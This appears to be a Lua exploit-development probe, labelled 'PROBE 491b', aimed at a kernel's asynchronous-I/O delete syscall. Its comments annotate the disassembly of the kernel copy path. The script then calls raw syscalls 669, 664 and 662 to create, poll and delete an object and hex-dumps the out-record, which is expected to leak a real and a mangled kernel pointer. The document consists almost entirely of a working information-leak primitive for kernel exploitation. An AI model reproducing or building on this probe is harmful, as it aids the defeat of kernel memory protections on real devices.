-- CRASH_CLASS: MODERATE
-- PROBE 491b: the delete out-record, taken on a deletable object
-- 13.60 delete body, after the lock drop:
--   3afd21 cmp qword [rbx+0x40],0      ; 4th argument = out records
--   3afd2e call 0xb078d0               ; returns "deletable"
--   3afd41 jne 0x3afd72                ; skip the copy unless BOTH hold
--   3afd53 mov rax,[r14+0x18] / 3afd57 mov rax,[rax]
--   3afd5a mov [rdi+rcx*8+8], rax      ; a real pointer
--   3afd5f mov rax,[r14+0x10]
--   3afd63 mov rdx,rax / sar rdx,4 / xor rdx,rax
--   3afd6d mov [rdi+rcx*8+0x10], rdx   ; mangled pointer
-- 489c proved a polled object deletes with status 0, so 0xb078d0 must return
-- non-zero and the copy path runs. 489a passed the 4th argument on an
-- unpolled object, where the copy is skipped; this repeats it after a poll.
print("=== PROBE 491b: delete out-record on a live object ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(buf, n)
    local o = {}
    for i = 0, n - 1, 8 do
        local ok, q = pcall(function() return memory.read_qword(buf + i) end)
        if not ok then o[#o + 1] = "??"; break end
        local hi, lo = 0, 0
        if type(q) == "table" and q.h then hi, lo = q.h, q.l else lo = to_num(q) end
        o[#o + 1] = string.format("%08X%08X", hi % 0x100000000, lo % 0x100000000)
    end
    return table.concat(o, " ")
end
local data = memory.alloc(0x2000)
local out  = memory.alloc(0x100)
local ids  = memory.alloc(0x100)
local res  = memory.alloc(0x400)
local rec  = memory.alloc(0x400)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
for off = 0, 0x400 - 1, 4 do pcall(function() memory.write_dword(rec + off, 0x51515151) end) end
local sc669 = make_syscall(669)
local sc662 = make_syscall(662)
local sc664 = make_syscall(664)
local ok, rv = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
local id = to_num(memory.read_dword(out))
print(string.format("[1] create ret=%s id=%d", ok and tostring(to_num(rv)) or "-", id))
if id <= 0 then print("=== abort ===") return end
pcall(function() memory.write_dword(ids, id) end)
local pok, prv = pcall(function() return sc664(uint64(ids), uint64(1), uint64(res)) end)
print(string.format("[2] poll ret=%s res0=%#x", pok and tostring(to_num(prv)) or "-", to_num(memory.read_dword(res))))
pcall(function() memory.write_dword(res, 0x77777777) end)
print("[3] delete with a 4th argument")
local dok, drv = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res), uint64(rec)) end)
print(string.format("[3] ret=%s status=%#x", dok and tostring(to_num(drv)) or "-", to_num(memory.read_dword(res))))
print("[3] res = " .. hex(res, 0x20))
print("[3] rec = " .. hex(rec, 0x60))
print("=== PROBE 491b COMPLETE ===")
